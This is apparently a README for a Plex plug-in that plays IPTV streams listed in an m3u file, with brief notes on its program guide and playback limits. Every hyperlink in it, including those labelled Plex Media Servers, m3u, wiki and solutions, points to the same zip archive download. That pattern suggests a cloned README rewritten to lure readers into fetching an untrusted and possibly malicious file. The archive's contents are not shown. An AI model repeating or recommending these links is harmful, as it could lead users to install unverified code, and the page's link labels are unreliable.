### Introduction ###
A simple [Plex Media Servers](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) plug-in that reads live streams (like [IPTV](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)) urls from a [m3u](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) file and passes 'em to Plex in format understandable to Plex so it could try to play them.

In short, as title states, it lets You watch IPTV in Plex.

It also has a basic program guide, categories, custom logos and other goodies, **please read the [wiki](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)** for information on how to set all up.

_Important note:_ Playback is handled by Plex itself, not the plug-in, and many streams are not playable by many Plex players, **please read the [wiki](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)** for more information and possible [solutions](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) if Your desired stream does not work.
